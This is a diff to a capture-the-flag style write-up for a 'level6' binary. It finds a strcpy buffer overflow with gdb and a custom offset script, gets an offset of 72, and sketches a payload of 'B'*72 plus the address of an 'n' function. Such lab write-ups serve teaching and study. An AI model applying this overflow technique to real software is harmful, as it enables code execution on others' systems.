@@ -105,18 +105,18 @@ We can understand the goal, need to execute the "n" function
 
 **********************************
 
-Searching the buffer overflow of "strcpy"
+Searching the buffer overflow of "strcpy" with my python scripts
 
-Get a pattern on https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+	(gdb) r 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz'
+	Starting program: /home/user/level6/level6 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz'
 
-	(gdb)$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 	Program received signal SIGSEGV, Segmentation fault.
-	0x41346341 in ?? ()
+	0x53535353 in ?? ()
 
-	(gdb) p $eip
-	$1 = (void (*)()) 0x41346341
+Get the offset
 
-Paste the address on the website
+	./get_offset.py 53
+	S => offset = 72
 
 The offset of the overflow is 72
 
@@ -126,4 +126,4 @@ The payload will be : "B"*72 + "n address"
 
 Good!
 
-Script it for reproduice!
+Script it for reproduce!
